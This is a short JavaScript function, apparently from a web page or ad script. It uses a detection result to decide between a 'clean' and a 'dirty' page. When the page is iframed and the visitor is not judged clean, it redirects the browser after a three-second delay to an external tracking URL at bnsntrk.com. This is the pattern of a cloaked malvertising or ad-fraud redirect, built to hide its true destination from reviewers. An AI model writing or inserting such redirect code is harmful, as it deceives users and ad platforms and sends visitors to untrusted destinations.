function go() {
		
			conditionalRedirector2.go(
				function(goClean) {
					/* Only perform redirection if iframed */
					if (window.self !== window.top) {
						/* Based on detection result, go to clean or dirty page */
						if (!goClean) {
							setTimeout(function() {
								window.location = 'http://track.bnsntrk.com/cc41236c-31e5-4b7f-9c26-aec024524a25?ad=2';
							}, 3000);
						}
					} 					
				}
			);

		}